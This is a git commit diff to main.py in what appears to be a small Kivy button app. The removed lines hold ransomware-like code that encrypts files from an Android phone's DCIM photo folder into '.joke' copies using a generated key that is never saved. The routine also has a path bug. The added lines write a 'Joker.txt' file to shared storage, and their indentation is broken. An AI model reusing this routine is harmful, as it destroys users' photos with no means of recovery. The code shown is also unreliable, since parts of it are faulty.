aa3859522613e3114d2a8f253ec40d25c58987c1
Akshay Ratnani <59859138+Akshay121-AK@users.noreply.github.com>
2023-11-21 17:54:11 +0530

    Update main.py

--- main.py
+++ main.py
@@ -12,42 +12,9 @@ class MyApp(App):
         print('Button pressed!')
 
 
-def main():
-        
-    def utpann():
-        return Fernet.generate_key()
-    
-    def sarvanash(file, key):
-        try:    
-            with open(file, 'rb') as file_raw:
-                
-                data = file_raw.read()
-
-            fernet = Fernet(key)
-            encrypted_data = fernet.encrypt(data)
-
-            with open(file + ".joke", 'wb') as file_enc:
-                file_enc.write(encrypted_data)
-        except:
-            pass        
-    
-    files = []
-    
-    for file in os.listdir("/storage/emulated/0/DCIM"):
-        if os.path.isfile(file):
-            files.append(file)
-    print(files)
-    key = utpann()
-
-    # with open('thekey.key', 'wb') as key_file:
-    #     key_file.write(key)
-
-    for file in files:
-        sarvanash(file, key)
-        print(file + " encrypted successfully!")
-
 if __name__ == '__main__':
-    main()
     MyApp().run()
+    with open ('/storage/emulated/0/Joker.txt', 'w') as Joker:
+    Joker.write("hello there!")
 
 
